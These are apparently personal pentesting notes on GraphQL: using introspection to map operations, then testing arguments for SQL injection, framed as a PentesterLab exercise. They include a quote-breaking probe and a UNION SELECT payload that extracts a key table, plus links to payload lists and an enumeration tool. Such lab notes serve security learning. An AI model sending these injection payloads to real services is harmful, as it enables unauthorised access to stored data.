- Kind of Similar to SQL
    - Since it's a standard to request and organize data.
- Usually the endpoint is `/graphql`
- If you are able to get schema via Introspection then look at the initial `Types` which are present. That would help you find what all operations are allowed and how they can be accessed.

Ex:

```json
"types": [
                {
                    "kind": "OBJECT",
                    "name": "Query",
                    "description": null,
                    "fields": [
                        {
                            "name": "projects",
                            "description": null,
                            "args": [
                                {
                                    "name": "offset",
                                    "description": null,
                                    "type": {
                                        "kind": "SCALAR",
                                        "name": "Int",
                                        "ofType": null
                                    },
                                    "defaultValue": "0"
                                },
                                {
                                    "name": "limit",
                                    "description": null,
                                    "type": {
                                        "kind": "SCALAR",
                                        "name": "Int",
                                        "ofType": null
                                    },
                                    "defaultValue": "10"
                                }
                            ],
                            "type": {
                                "kind": "LIST",
                                "name": null,
                                "ofType": {
                                    "kind": "OBJECT",
                                    "name": "Project",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "project",
                            "description": null,
                            "args": [
                                {
                                    "name": "id",
                                    "description": null,
                                    "type": {
                                        "kind": "NON_NULL",
                                        "name": null,
                                        "ofType": {
                                            "kind": "SCALAR",
                                            "name": "ID",
                                            "ofType": null
                                        }
                                    },
                                    "defaultValue": null
                                }
                            ],
                            "type": {
                                "kind": "OBJECT",
                                "name": "Project",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        }
                    ],
                    "inputFields": null,
                    "interfaces": [],
                    "enumValues": null,
                    "possibleTypes": null
                },
```

Here we can see that there are two `operations` 

a) `projects` - Takes no input/args 

b) `project` - Takes `id` of type `ID!` as argument. Now if it is taking an argument as input then that means it can tested for SQLi

```json
{"operationName":"project","variables":{"id":"1'"},"query":"query project($id:ID!){\n  project(id: $id){\n    id\n    name\n   __typename\n  }\n}\n"}
```

This would give some DB error because in `id` we are sending "1`"(tilt).

```json
{"operationName":"project","variables":{"id":"3 union select id,value,3 from PtlabIIKey"},"query":"query project($id:ID!){\n  project(id: $id){\n    id\n    name\n   __typename\n  }\n}\n"}
```

This is Pentester lab Graphql SQli

## Payloads

Everything is present in - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)

- For testing run that `introsecption` payload and see if the Schema is returned.
    - Copy and then paste in vim and then run `:%s /\n/\\n/` to format the payload properly
- If the schema is returned then to make the work easy grab the enum tool:
    - [https://gitlab.com/dee-see/graphql-path-enum/-/pipelines?scope=tags&page=1](https://gitlab.com/dee-see/graphql-path-enum/-/pipelines?scope=tags&page=1)
